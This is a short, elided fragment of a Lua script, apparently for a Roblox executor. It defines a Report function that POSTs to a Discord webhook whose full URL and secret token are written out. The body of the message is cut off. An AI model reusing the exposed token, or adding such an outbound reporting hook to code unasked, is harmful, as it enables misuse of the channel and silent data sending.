(function() 
    ...
    function Report(Message) 
        if true then 
            ...
            request({
                Url = "https://discord.com/api/webhooks/1421487661100568587/M6xgvSsFOHU-i3gO4d-lAUDd_NOv0zNbRciHMvr1VWc7ShlOE0So8oUAh-ZF43AainwG", 
                Method = "POST", 
